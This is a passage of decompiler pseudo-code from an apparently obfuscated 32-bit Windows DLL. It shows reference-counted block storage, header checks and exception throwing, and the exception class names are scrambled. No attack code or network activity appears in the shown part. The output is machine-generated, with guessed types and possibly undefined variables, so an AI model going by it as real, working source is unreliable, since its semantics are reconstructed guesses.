          v7 = sub_1000F1B1((int)Block, (int)v13, p_Addend, (int)v15, (int)v16);
        }
        else
        {
          v7 = 0;
        }
        LOBYTE(v30) = 4;
        sub_1000728E(v19, v7);
        LOBYTE(v30) = 8;
        Block = operator new(0x28u);
        LOBYTE(v30) = 9;
        if ( Block )
        {
          v15 = v16;
          v23 = &v15;
          sub_1000D372(&v15, (int)v22);
          LOBYTE(v30) = 10;
          v24 = &v13;
          p_Addend = lpAddend;
          v13 = (_DWORD *)v4;
          InterlockedIncrement(lpAddend);
          LOBYTE(v30) = 9;
          v8 = sub_1000F1B1((int)Block, (int)v13, p_Addend, (int)v15, (int)v16);
        }
        else
        {
          v8 = 0;
        }
        LOBYTE(v30) = 8;
        sub_1000728E(&v20, v8);
        LOBYTE(v30) = 12;
        v23 = &v15;
        v16 = v21;
        v15 = (volatile LONG *)v20;
        InterlockedIncrement(v21);
        LOBYTE(v30) = 13;
        v9 = (void (__thiscall **)(void *, volatile LONG *, volatile LONG *))(*(_DWORD *)v19[0] + 24);
        LOBYTE(v30) = 12;
        (*v9)(v19[0], v15, v16);
        LOBYTE(v30) = 8;
        sub_10007D7A((void **)&v20);
        LOBYTE(v30) = 4;
        sub_10007D7A(v19);
        v3 = v26;
      }
    }
    LOBYTE(v30) = 3;
    sub_1000D3AD(v22);
  }
  LOBYTE(v30) = 0;
  sub_100068A5(&v17);
  v30 = -1;
  sub_10007D7A((void **)&a2);
}

//----- (100165A0) --------------------------------------------------------
int __thiscall sub_100165A0(void *this, int a2)
{
  _DWORD *v2; // edi
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  int v5; // eax
  bool v6; // zf
  _DWORD *v7; // eax
  int v9[5]; // [esp+Ch] [ebp-28h] BYREF
  _DWORD v10[2]; // [esp+20h] [ebp-14h] BYREF
  int v11; // [esp+30h] [ebp-4h]

  *(_DWORD *)a2 = this;
  sub_10016ACA((int)this, (_DWORD *)(a2 + 16), 0);
  v11 = 0;
  v2 = *(_DWORD **)(a2 + 16);
  if ( *v2 )
  {
    v3 = sub_10016E5C(v10);
    LOBYTE(v11) = 1;
    sub_100171B9((int)v3, 20);
  }
  sub_1000B36F(v2 + 1, (int)v9);
  LOBYTE(v11) = 2;
  if ( v9[3] != 10 )
  {
    v4 = sub_10016E5C(v10);
    LOBYTE(v11) = 3;
    sub_100171B9((int)v4, 27);
  }
  *(_DWORD *)(a2 + 8) = sub_1000B6F2(v9, 2);
  *(_WORD *)(a2 + 4) = sub_1000B746(v9, 0);
  v5 = sub_1000B6F2(v9, 6);
  v6 = *(_WORD *)(a2 + 4) == 257;
  *(_DWORD *)(a2 + 12) = v5;
  if ( !v6 )
  {
    v7 = sub_10016E5C(v10);
    LOBYTE(v11) = 4;
    sub_100171B9((int)v7, 36);
  }
  LOBYTE(v11) = 0;
  sub_1000B3DF(v9);
  return a2;
}
// 100165A0: using guessed type _DWORD var_14[2];

//----- (1001666A) --------------------------------------------------------
void __thiscall sub_1001666A(_DWORD *this)
{
  _DWORD *v1; // esi

  v1 = this + 1;
  sub_1000FDB7((int)(this + 1));
  sub_1000E843(v1);
}

//----- (1001669A) --------------------------------------------------------
char *__thiscall sub_1001669A(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 1);
  sub_1001666A(this - 1);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (100166BC) --------------------------------------------------------
void __stdcall sub_100166BC(int *a1, int a2)
{
  int v2; // ecx
  int v3; // [esp-Ch] [ebp-38h]
  _DWORD *v4; // [esp-8h] [ebp-34h]
  volatile LONG *v5; // [esp-4h] [ebp-30h]
  LONG v6[5]; // [esp+Ch] [ebp-20h] BYREF
  int v7; // [esp+28h] [ebp-4h]

  a1[2] = a2;
  sub_1000B36F((_DWORD *)(a1[4] + 4), (int)v6);
  v7 = 0;
  sub_1000B713(v2, v6, 2, a1[2]);
  sub_1000B3BD(v6, a1[4] + 4);
  v5 = (volatile LONG *)a1[5];
  v4 = (_DWORD *)a1[4];
  InterlockedIncrement(v5);
  LOBYTE(v7) = 1;
  v3 = *a1;
  LOBYTE(v7) = 0;
  sub_10016EB9(v3, v4, (int)v5);
  v7 = -1;
  sub_1000B3DF(v6);
}
// 100166F0: variable 'v2' is possibly undefined
// 100166BC: using guessed type LONG var_20[5];

//----- (1001674C) --------------------------------------------------------
_DWORD *__thiscall sub_1001674C(void *this, _DWORD *a2, unsigned int a3)
{
  *a2 = this;
  sub_10016ACA((int)this, a2 + 2, a3);
  a2[1] = sub_1000B6F2((_DWORD *)(a2[2] + 4), 0);
  return a2;
}

//----- (10016793) --------------------------------------------------------
int *__stdcall sub_10016793(int *a1, int a2, int a3, char *a4, int a5)
{
  int v5; // ecx
  int v6; // ecx
  _DWORD *v7; // eax
  int v9[4]; // [esp-14h] [ebp-48h] BYREF
  int v10; // [esp-4h] [ebp-38h]
  int v11[5]; // [esp+Ch] [ebp-28h] BYREF
  void *v12[2]; // [esp+20h] [ebp-14h] BYREF
  int v13; // [esp+30h] [ebp-4h]

  *a1 = a2;
  v10 = 0;
  a1[1] = a5;
  sub_10050B91(a1 + 2, v10);
  v13 = 0;
  sub_1000B1F3(a4 - 9, (int)v11, 0);
  LOBYTE(v13) = 1;
  sub_1000B79B(v5, v11);
  sub_1000B713(v6, v11, 0, a1[1]);
  sub_1000B36F(v11, (int)v9);
  LOBYTE(v13) = 1;
  v7 = sub_10016A27(a2, v12, a3, v9[0], v9[1], v9[2], v9[3], v10);
  LOBYTE(v13) = 3;
  sub_10010CC6(v7, (int)(a1 + 2));
  LOBYTE(v13) = 1;
  sub_10008301(v12);
  LOBYTE(v13) = 0;
  sub_1000B3DF(v11);
  return a1;
}
// 100167D9: variable 'v5' is possibly undefined
// 100167E3: variable 'v6' is possibly undefined
// 10016793: using guessed type int var_28[5];

//----- (1001684C) --------------------------------------------------------
int __stdcall sub_1001684C(int a1, int a2)
{
  _DWORD *v2; // edi
  _DWORD *v3; // eax
  void *v5[2]; // [esp+10h] [ebp-20h] BYREF
  int v6[3]; // [esp+18h] [ebp-18h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  *(_DWORD *)(a1 + 8) = -1;
  *(_DWORD *)(a1 + 16) = a2;
  *(_DWORD *)(a1 + 4) = 0;
  *(_BYTE *)(a1 + 12) = 0;
  *(_BYTE *)(a1 + 13) = 0;
  *(_BYTE *)(a1 + 14) = 0;
  *(_DWORD *)a1 = &off_10102938;
  v2 = sub_1000B87D(v5);
  v7 = 0;
  v3 = (_DWORD *)(*(int (__thiscall **)(_DWORD, int *))(**(_DWORD **)(a1 + 16) + 36))(*(_DWORD *)(a1 + 16), v6);
  LOBYTE(v7) = 1;
  sub_1001EF3B(a1 + 20, v3, 0, *(LPSECURITY_ATTRIBUTES *)(*v2 + 4));
  LOBYTE(v7) = 3;
  sub_1000D3AD(v6);
  LOBYTE(v7) = 4;
  sub_10007D7A(v5);
  sub_1000D17D((_DWORD *)(a1 + 48), &word_10179CD0);
  *(_DWORD *)(a1 + 56) = 0;
  return a1;
}
// 10102938: using guessed type int (__thiscall *off_10102938)(void *Block, char);
// 1001684C: using guessed type int var_18[3];

//----- (100168F0) --------------------------------------------------------
void *__thiscall sub_100168F0(void *Block, char a2)
{
  sub_1001690F((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001690F) --------------------------------------------------------
void __thiscall sub_1001690F(int this)
{
  int v2; // [esp+0h] [ebp-28h] BYREF
  _DWORD *v3[4]; // [esp+Ch] [ebp-1Ch] BYREF
  int v4; // [esp+24h] [ebp-4h]

  v3[3] = &v2;
  v3[2] = (_DWORD *)this;
  *(_DWORD *)this = &off_10102938;
  v4 = 2;
  sub_1000EDE4((int *)(this + 20), v3);
  LOBYTE(v4) = 3;
  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(this + 16) + 8))(*(_DWORD *)(this + 16));
  LOBYTE(v4) = 2;
  sub_1000EDA4(v3);
  v4 = 0;
  sub_1000D3AD((int *)(this + 48));
  v4 = -1;
  sub_1001F16A((HANDLE *)(this + 20));
}
// 10102938: using guessed type int (__thiscall *off_10102938)(void *Block, char);

//----- (10016995) --------------------------------------------------------
void __thiscall sub_10016995(void *this)
{
  char v1[28]; // [esp+0h] [ebp-28h] BYREF
  int v2; // [esp+24h] [ebp-4h]

  sub_100165A0(this, (int)v1);
  v2 = -1;
  sub_100169D9((int)v1);
}

//----- (100169D9) --------------------------------------------------------
void __stdcall sub_100169D9(int a1)
{
  sub_10008301((void **)(a1 + 16));
}

//----- (10016A00) --------------------------------------------------------
void __stdcall sub_10016A00(int a1)
{
  sub_10008301((void **)(a1 + 8));
}

//----- (10016A27) --------------------------------------------------------
_DWORD *__stdcall sub_10016A27(int a1, _DWORD *a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  _DWORD *v11; // [esp-8h] [ebp-24h]
  volatile LONG *v12; // [esp-4h] [ebp-20h]

  v8 = operator new(0x20u);
  if ( v8 )
    v9 = sub_100191D6(&a4, v8, 12);
  else
    v9 = 0;
  sub_10050B91(a2, (int)v9);
  *(_DWORD *)(*a2 + 28) = a3;
  v12 = (volatile LONG *)a2[1];
  v11 = (_DWORD *)*a2;
  InterlockedIncrement(v12);
  sub_10016EB9(a1, v11, (int)v12);
  sub_1000B3DF(&a4);
  return a2;
}

//----- (10016ACA) --------------------------------------------------------
_DWORD *__thiscall sub_10016ACA(int this, _DWORD *a2, unsigned int a3)
{
  _DWORD *v4; // eax
  void *v5; // eax
  _DWORD *v6; // eax
  _DWORD *v8[2]; // [esp+Ch] [ebp-24h] BYREF
  int v9; // [esp+14h] [ebp-1Ch]
  int v10; // [esp+18h] [ebp-18h] BYREF
  void *Block; // [esp+1Ch] [ebp-14h]
  int v12; // [esp+2Ch] [ebp-4h]

  v12 = 0;
  v9 = 0;
  sub_1000EDE4((int *)this, v8);
  v12 = 1;
  if ( a3 >= (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 16) + 16))(*(_DWORD *)(this + 16)) )
  {
    v4 = sub_10016E5C(&v10);
    LOBYTE(v12) = 2;
    sub_100171B9((int)v4, 195);
  }
  Block = operator new(0x20u);
  LOBYTE(v12) = 3;
  if ( Block )
  {
    v5 = (void *)(***(int (__thiscall ****)(_DWORD))(this + 16))(*(_DWORD *)(this + 16));
    v6 = sub_10019192(Block, v5, a3);
  }
  else
  {
    v6 = 0;
  }
  LOBYTE(v12) = 1;
  sub_10050B91(a2, (int)v6);
  v9 = 1;
  LOBYTE(v12) = 0;
  sub_1000EDA4(v8);
  return a2;
}

//----- (10016B71) --------------------------------------------------------
void __userpurge sub_10016B71(char *a1@<ecx>, char *a2@<ebx>, int a3@<esi>, int a4, char *a5, int a6, int *a7)
{
  int v7; // edi
  int v8[4]; // [esp+8h] [ebp-30h] BYREF
  int v9[5]; // [esp+18h] [ebp-20h] BYREF
  int v10; // [esp+34h] [ebp-4h]

  v7 = (int)a1;
  if ( &a2[a3] == a1 )
  {
    a5 = &a5[(_DWORD)a2];
    v7 = a3;
  }
  sub_10016793(v8, a4, v7, a5, a6);
  v10 = 0;
  if ( a3 )
  {
    if ( v7 != a3 )
    {
      sub_10016793(v9, a4, a3, a2, v7);
      LOBYTE(v10) = 0;
      sub_10016A00((int)v9);
    }
  }
  else
  {
    sub_100166BC(a7, v7);
  }
  v10 = -1;
  sub_10016A00((int)v8);
}
// 10016B71: using guessed type int var_30[4];
// 10016B71: using guessed type int var_20[5];

//----- (10016BEF) --------------------------------------------------------
void __fastcall sub_10016BEF(char *a1, char *a2, void *a3)
{
  unsigned int v5; // edi
  char *v6; // [esp+10h] [ebp-40h]
  int v7; // [esp+14h] [ebp-3Ch]
  int v8; // [esp+18h] [ebp-38h] BYREF
  unsigned int v9; // [esp+1Ch] [ebp-34h]
  int v10; // [esp+20h] [ebp-30h]
  int v11[2]; // [esp+28h] [ebp-28h] BYREF
  unsigned int v12; // [esp+30h] [ebp-20h]
  int v13; // [esp+4Ch] [ebp-4h]

  sub_100165A0(a3, (int)v11);
  v13 = 0;
  v5 = v12;
  v7 = 0;
  v6 = 0;
  if ( v12 )
  {
    while ( 1 )
    {
      sub_1001674C(a3, &v8, v5);
      LOBYTE(v13) = 1;
      if ( (unsigned int)a2 < v5 )
        break;
      v7 = v5;
      v5 = v9;
      v6 = (char *)(*(_DWORD *)(v10 + 24) + 9);
      LOBYTE(v13) = 0;
      sub_10016A00((int)&v8);
      if ( !v5 )
        goto LABEL_4;
    }
    if ( (char *)v5 == &a1[(_DWORD)a2] )
    {
      v5 = v9;
      a1 += *(_DWORD *)(v10 + 24) + 9;
    }
    sub_10016B71(a2, v6, v7, (int)a3, a1, v5, v11);
    LOBYTE(v13) = 0;
    sub_10016A00((int)&v8);
  }
  else
  {
LABEL_4:
    sub_10016B71(a2, v6, v7, (int)a3, a1, v5, v11);
  }
  v13 = -1;
  sub_100169D9((int)v11);
}

//----- (10016CEA) --------------------------------------------------------
unsigned int __usercall sub_10016CEA@<eax>(unsigned int a1@<ecx>, _DWORD **a2@<ebx>)
{
  unsigned int v3; // edi
  char *v4; // eax
  _DWORD *v5; // eax
  int v6; // esi
  char *v8; // [esp-8h] [ebp-70h]
  int v9; // [esp+Ch] [ebp-5Ch]
  int pExceptionObject[2]; // [esp+10h] [ebp-58h] BYREF
  char *v11; // [esp+18h] [ebp-50h] BYREF
  int v12; // [esp+20h] [ebp-48h] BYREF
  unsigned int v13; // [esp+24h] [ebp-44h]
  int v14; // [esp+28h] [ebp-40h]
  int v15[4]; // [esp+30h] [ebp-38h] BYREF
  int v16[2]; // [esp+40h] [ebp-28h] BYREF
  unsigned int v17; // [esp+48h] [ebp-20h]
  unsigned int v18; // [esp+4Ch] [ebp-1Ch]
  int v19; // [esp+64h] [ebp-4h]

  sub_100165A0(a2, (int)v16);
  v19 = 0;
  v3 = v17;
  pExceptionObject[0] = 0;
  v11 = 0;
  if ( v17 )
  {
    while ( 1 )
    {
      sub_1001674C(a2, &v12, v3);
      LOBYTE(v19) = 1;
      v4 = (char *)(*(_DWORD *)(v14 + 24) + 9);
      v9 = v13;
      if ( (unsigned int)v4 >= a1 )
        break;
      pExceptionObject[0] = v3;
      v11 = v4;
      v3 = v13;
      LOBYTE(v19) = 0;
      sub_10016A00((int)&v12);
      if ( !v3 )
        goto LABEL_4;
    }
    if ( (unsigned int)v4 > a1 )
    {
      v8 = &v4[-a1];
      v6 = v3 + a1;
      sub_10016793(v15, (int)a2, v6, v8, v13);
      v9 = v6;
      LOBYTE(v19) = 1;
      sub_10016A00((int)v15);
    }
    if ( pExceptionObject[0] )
    {
      sub_10016793(v15, (int)a2, pExceptionObject[0], v11, v9);
      LOBYTE(v19) = 1;
      sub_10016A00((int)v15);
    }
    else
    {
      sub_100166BC(v16, v9);
    }
    LOBYTE(v19) = 0;
    sub_10016A00((int)&v12);
  }
  else
  {
LABEL_4:
    v3 = (*(int (__thiscall **)(_DWORD *))(*a2[4] + 16))(a2[4]);
    if ( v3 + a1 > v18 )
    {
      v5 = sub_10016E5C(&v11);
      LOBYTE(v19) = 4;
      sub_100171DD(pExceptionObject, (int)v5, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVXcyfvsawkyZkgVqxqXcyfvsawKyzkgvqxq_ezrqwlx_sr__);
    }
    (*(void (__thiscall **)(_DWORD *, unsigned int))(*a2[4] + 20))(a2[4], v3 + a1);
  }
  v19 = -1;
  sub_100169D9((int)v16);
  return v3;
}
// 10016CEA: using guessed type int var_38[4];

//----- (10016E5C) --------------------------------------------------------
_DWORD *__stdcall sub_10016E5C(_DWORD *a1)
{
  *a1 = &unk_10102930;
  sub_1000E7F7(a1 + 1, 1, 0);
  sub_1000FD12(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10102928;
  return a1;
}
// 10102928: using guessed type int (__stdcall *off_10102928)(char);

//----- (10016EB9) --------------------------------------------------------
void __stdcall sub_10016EB9(int a1, _DWORD *a2, int a3)
{
  void *v3; // eax

  v3 = (void *)(*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 16) + 4))(*(_DWORD *)(a1 + 16));
  sub_1001936C(v3, a2);
  sub_10008301((void **)&a2);
}

//----- (10016EF8) --------------------------------------------------------
void __thiscall sub_10016EF8(int *this, int a2, volatile LONG *lpAddend)
{
  _DWORD *v4; // esi
  unsigned int v5; // ecx
  unsigned int v6; // edi
  _DWORD *v7; // [esp-8h] [ebp-30h] BYREF
  volatile LONG *v8; // [esp-4h] [ebp-2Ch]
  _DWORD *v9[4]; // [esp+Ch] [ebp-1Ch] BYREF
  int v10; // [esp+24h] [ebp-4h]

  v10 = 0;
  sub_1000EDE4(this, v9);
  LOBYTE(v10) = 1;
  v4 = (_DWORD *)a2;
  v5 = 13 * ((*(_DWORD *)(a2 + 24) + 21) / 0xDu);
  v6 = 13 * ((*(_DWORD *)(a2 + 16) + 21) / 0xDu);
  if ( v5 >= v6 )
  {
    if ( v5 > v6 )
      sub_10016BEF((char *)(v5 - v6), (char *)(*(_DWORD *)(a2 + 28) + v6), this);
  }
  else
  {
    sub_10016BEF((char *)v5, *(char **)(a2 + 28), this);
    v4[7] = sub_10016CEA(v6, (_DWORD **)this);
  }
  v9[2] = &v7;
  v8 = lpAddend;
  v7 = v4;
  InterlockedIncrement(lpAddend);
  LOBYTE(v10) = 1;
  sub_10016EB9((int)this, v7, (int)v8);
  LOBYTE(v10) = 0;
  sub_1000EDA4(v9);
  v10 = -1;
  sub_10008301((void **)&a2);
}

//----- (10016FB9) --------------------------------------------------------
int __stdcall sub_10016FB9(int *a1, unsigned int a2)
{
  _DWORD *v3[2]; // [esp+8h] [ebp-20h] BYREF
  void *v4[3]; // [esp+10h] [ebp-18h] BYREF
  int v5; // [esp+24h] [ebp-4h]

  sub_1000EDE4(a1, v3);
  v5 = 0;
  sub_10016ACA((int)a1, v4, a2);
  LOBYTE(v5) = 1;
  sub_10016BEF((char *)(13 * ((*((_DWORD *)v4[0] + 6) + 21) / 0xDu)), *((char **)v4[0] + 7), a1);
  LOBYTE(v5) = 0;
  sub_10008301(v4);
  v5 = -1;
  return sub_1000EDA4(v3);
}

//----- (10017033) --------------------------------------------------------
void __thiscall sub_10017033(int *this, _DWORD *a2, volatile LONG *lpAddend)
{
  _DWORD *v4; // esi
  unsigned int v5; // eax
  volatile LONG *v6; // ecx
  _DWORD *v7; // [esp-8h] [ebp-2Ch] BYREF
  volatile LONG *v8; // [esp-4h] [ebp-28h]
  _DWORD *v9[3]; // [esp+Ch] [ebp-18h] BYREF
  int v10; // [esp+20h] [ebp-4h]

  v10 = 0;
  sub_1000EDE4(this, v9);
  LOBYTE(v10) = 1;
  v4 = a2;
  v5 = sub_10016CEA(13 * ((a2[6] + 21) / 0xDu), (_DWORD **)this);
  v6 = lpAddend;
  v4[7] = v5;
  v9[2] = &v7;
  v8 = v6;
  v7 = v4;
  InterlockedIncrement(v6);
  LOBYTE(v10) = 1;
  sub_10016EB9((int)this, v7, (int)v8);
  LOBYTE(v10) = 0;
  sub_1000EDA4(v9);
  v10 = -1;
  sub_10008301((void **)&a2);
}

//----- (100170C0) --------------------------------------------------------
char __thiscall sub_100170C0(int this)
{
  char result; // al
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  result = sub_1000ECB1((int *)(this + 20));
  v4 = 0;
  if ( !*(_DWORD *)(this + 56) )
  {
    result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 16) + 24))(*(_DWORD *)(this + 16));
    if ( result )
      result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 16) + 8))(*(_DWORD *)(this + 16));
  }
  v4 = -1;
  ++*(_DWORD *)(this + 56);
  return result;
}

//----- (10017128) --------------------------------------------------------
int __thiscall sub_10017128(int this)
{
  _DWORD v4[5]; // [esp+0h] [ebp-20h] BYREF
  int v5; // [esp+1Ch] [ebp-4h]

  v4[4] = v4;
  v4[3] = this;
  if ( (*(_DWORD *)(this + 56))-- == 1 )
  {
    v5 = 0;
    (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(this + 16) + 8))(*(_DWORD *)(this + 16));
    v5 = -1;
  }
  return sub_1000EC84((_DWORD *)(this + 20));
}

//----- (10017180) --------------------------------------------------------
void *__stdcall sub_10017180(int a1, void *a2)
{
  (*(void (__thiscall **)(_DWORD, void *))(**(_DWORD **)(a1 + 16) + 36))(*(_DWORD *)(a1 + 16), a2);
  return a2;
}

//----- (100171B9) --------------------------------------------------------
void __cdecl __noreturn sub_100171B9(int a1, int a2)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_100171DD(pExceptionObject, a1, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVWdlkztgsnlAzzaqwwdlKztgsnlaz_ezrqwlx_sr__);
}
// 100171B9: using guessed type _DWORD pExceptionObject[2];

//----- (100171DD) --------------------------------------------------------
_DWORD *__thiscall sub_100171DD(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10102930;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_1000E7B3(this + 1, v4);
  }
  sub_10010D38(this, a2, 0);
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_10102928;
  return this;
}
// 10102928: using guessed type int (__stdcall *off_10102928)(char);

//----- (10017256) --------------------------------------------------------
_DWORD *__stdcall sub_10017256(_DWORD *a1, LPCWSTR lpName, int a3, int a4)
{
  int v5[5]; // [esp+0h] [ebp-20h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v6 = 0;
  v5[4] = (int)v5;
  *a1 = &off_10102950;
  sub_1000D372(v5, (int)&a3);
  LOBYTE(v6) = 0;
  sub_1002052F((int)(a1 + 1), 4u, lpName, v5[0], v5[1]);
  v6 = -1;
  sub_1000D3AD(&a3);
  return a1;
}
// 10102950: using guessed type int (__thiscall *off_10102950)(void *Block, char);

//----- (100172B4) --------------------------------------------------------
_DWORD *__thiscall sub_100172B4(_DWORD *Block, char a2)
{
  sub_100172D3(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100172D3) --------------------------------------------------------
bool __thiscall sub_100172D3(_DWORD *this)
{
  *this = &off_10102950;
  return sub_100206E3(this + 1);
}
// 10102950: using guessed type int (__thiscall *off_10102950)(void *Block, char);

//----- (100172FF) --------------------------------------------------------
void __thiscall sub_100172FF(int *this)
{
  sub_1000D3AD(this + 1);
}

//----- (10017325) --------------------------------------------------------
_DWORD *__stdcall sub_10017325(_DWORD *a1, int a2, int a3, volatile LONG *lpAddend, int a5)
{
  int v5; // eax
  int v6; // ebx
  volatile LONG *v7; // eax
  int v9[5]; // [esp+Ch] [ebp-3Ch] BYREF
  int v10[5]; // [esp+20h] [ebp-28h] BYREF
  int v11; // [esp+34h] [ebp-14h] BYREF
  LONG v12; // [esp+38h] [ebp-10h] BYREF
  int v13; // [esp+44h] [ebp-4h]

  v13 = 0;
  sub_1000D17D(a1 + 1, &word_10179518);
  a1[3] = a2;
  v5 = a5;
  a1[5] = 0;
  v6 = a3;
  a1[4] = v5;
  v7 = lpAddend;
  *a1 = &off_10102954;
  a1[7] = v7;
  a1[6] = v6;
  InterlockedIncrement(v7);
  LOBYTE(v13) = 3;
  sub_1000B36F((_DWORD *)(v6 + 4), (int)v10);
  LOBYTE(v13) = 4;
  a1[8] = sub_1000B6F2(v10, 4);
  a1[9] = sub_1000B6F2(v10, 0);
  sub_1000B67C(v10, (int)v9, 8, v10[3] - 8);
  LOBYTE(v13) = 5;
  sub_1000CCFC(&v11);
  LOBYTE(v13) = 7;
  sub_10001236(&v12, a1 + 2);
  LOBYTE(v13) = 5;
  sub_1000D3AD(&v11);
  LOBYTE(v13) = 4;
  sub_1000B3DF(v9);
  LOBYTE(v13) = 3;
  sub_1000B3DF(v10);
  v13 = -1;
  sub_10008301((void **)&a3);
  return a1;
}
// 10102954: using guessed type int (__stdcall *off_10102954)(char);
// 10017325: using guessed type int var_3C[5];

//----- (10017420) --------------------------------------------------------
int __thiscall sub_10017420(int this, char a2)
{
  sub_10008301((void **)(this + 24));
  sub_100172FF((int *)this);
  if ( (a2 & 1) != 0 )
    j__free((void *)this);
  return this;
}

//----- (10017466) --------------------------------------------------------
_DWORD *__thiscall sub_10017466(void *this, _DWORD *a2, void *a3, int a4, int a5, void *Block, _DWORD *a7)
{
  int v7; // ecx
  int v8; // ecx
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  void *v11; // ecx
  _DWORD *v12; // edi
  _DWORD *v13; // esi
  _DWORD *v14; // eax
  int *v15; // eax
  _DWORD *v17; // [esp-8h] [ebp-4Ch] BYREF
  void *v18; // [esp-4h] [ebp-48h]
  int v19[5]; // [esp+Ch] [ebp-38h] BYREF
  int v20[6]; // [esp+20h] [ebp-24h] BYREF
  int v21; // [esp+40h] [ebp-4h]
  void **v22; // [esp+50h] [ebp+Ch]

  v21 = 0;
  v18 = this;
  v17 = this;
  v20[5] = (int)&v17;
  sub_1000D372(&v17, (int)&a4);
  LOBYTE(v21) = 0;
  sub_1002071F((int)a2, (int)a3, (int)v17, (int)v18);
  LOBYTE(v21) = 2;
  v18 = 0;
  *a2 = &off_10102954;
  a2[4] = 0;
  a2[5] = 0;
  v22 = (void **)(a2 + 6);
  sub_10050B91(a2 + 6, (int)v18);
  LOBYTE(v21) = 3;
  v18 = 0;
  a2[9] = Block;
  sub_1000B1F3((void *)8, (int)v20, v18);
  LOBYTE(v21) = 4;
  sub_1000B713(v7, v20, 0, a2[9]);
  sub_1000B713(v8, v20, 4, a2[8]);
  v9 = sub_1000CDC9((int)(a2 + 1), v19);
  LOBYTE(v21) = 5;
  sub_1000B544(v9, (int)v20);
  LOBYTE(v21) = 4;
  sub_1000B3DF(v19);
  v10 = operator new(0x20u);
  v11 = v18;
  Block = v10;
  LOBYTE(v21) = 6;
  if ( v10 )
    v12 = sub_100191D6(v20, v10, 3);
  else
    v12 = 0;
  LOBYTE(v21) = 4;
  v13 = a2 + 6;
  if ( *v22 != v12 )
  {
    sub_10008338(v22);
    v14 = operator new(4u);
    v11 = v18;
    LOBYTE(v21) = 7;
    if ( v14 )
      *v14 = 1;
    else
      v14 = 0;
    LOBYTE(v21) = 4;
    a2[7] = v14;
    *v13 = v12;
  }
  v18 = v11;
  v17 = v11;
  v18 = (void *)a2[7];
  v17 = (_DWORD *)*v13;
  InterlockedIncrement((volatile LONG *)v18);
  LOBYTE(v21) = 8;
  v15 = *(int **)(a2[3] + 48);
  LOBYTE(v21) = 4;
  sub_10017033(v15, v17, (volatile LONG *)v18);
  sub_100175D1(a7, a2);
  LOBYTE(v21) = 3;
  sub_1000B3DF(v20);
  v21 = -1;
  sub_1000D3AD(&a4);
  return a2;
}
// 100174DE: variable 'v7' is possibly undefined
// 100174E8: variable 'v8' is possibly undefined
// 1001756B: variable 'v11' is possibly undefined
// 10102954: using guessed type int (__stdcall *off_10102954)(char);
// 10017466: using guessed type int var_38[5];

//----- (100175D1) --------------------------------------------------------
void __thiscall sub_100175D1(_DWORD *this, _DWORD *a2)
{
  int v3; // ecx
  volatile LONG *v4; // eax
  volatile LONG *v5; // ecx
  int v6; // ecx
  int *v7; // ecx
  int v8; // [esp-8h] [ebp-40h] BYREF
  volatile LONG *v9; // [esp-4h] [ebp-3Ch]
  int *v10; // [esp+10h] [ebp-28h]
  LONG v11[6]; // [esp+14h] [ebp-24h] BYREF
  int v12; // [esp+34h] [ebp-4h]

  if ( this )
    this[4] = a2;
  sub_1000B36F((_DWORD *)(a2[6] + 4), (int)v11);
  v12 = 0;
  a2[5] = this;
  if ( this )
    v4 = *(volatile LONG **)(this[6] + 28);
  else
    v4 = 0;
  if ( v4 != (volatile LONG *)a2[8] )
  {
    v9 = v4;
    v8 = 4;
    a2[8] = v4;
    sub_1000B713(v3, v11, v8, (int)v9);
    sub_1000B3BD(v11, a2[6] + 4);
    v9 = v5;
    v8 = (int)v5;
    v9 = (volatile LONG *)a2[7];
    v6 = a2[6];
    v10 = &v8;
    v8 = v6;
    InterlockedIncrement(v9);
    LOBYTE(v12) = 1;
    v7 = *(int **)(a2[3] + 48);
    LOBYTE(v12) = 0;
    sub_10016EF8(v7, v8, v9);
  }
  v12 = -1;
  sub_1000B3DF(v11);
}
// 10017633: variable 'v3' is possibly undefined
// 1001764A: variable 'v5' is possibly undefined
// 100175D1: using guessed type LONG var_24[6];

//----- (1001769D) --------------------------------------------------------
void __stdcall sub_1001769D(_DWORD *a1, int Src)
{
  int v2; // ecx
  int *v3; // esi
  int v4; // [esp-8h] [ebp-38h]
  volatile LONG *v5; // [esp-4h] [ebp-34h]
  LONG v6[5]; // [esp+10h] [ebp-20h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  sub_1000B36F((_DWORD *)(a1[6] + 4), (int)v6);
  v7 = 0;
  if ( sub_1000B6F2(v6, 0) != Src )
  {
    sub_1000B713(v2, v6, 0, Src);
    a1[9] = Src;
    sub_1000B3BD(v6, a1[6] + 4);
    v5 = (volatile LONG *)a1[7];
    v4 = a1[6];
    InterlockedIncrement(v5);
    LOBYTE(v7) = 1;
    v3 = *(int **)(a1[3] + 48);
    LOBYTE(v7) = 0;
    sub_10016EF8(v3, v4, v5);
  }
  v7 = -1;
  sub_1000B3DF(v6);
}
// 100176D9: variable 'v2' is possibly undefined
// 1001769D: using guessed type LONG var_20[5];

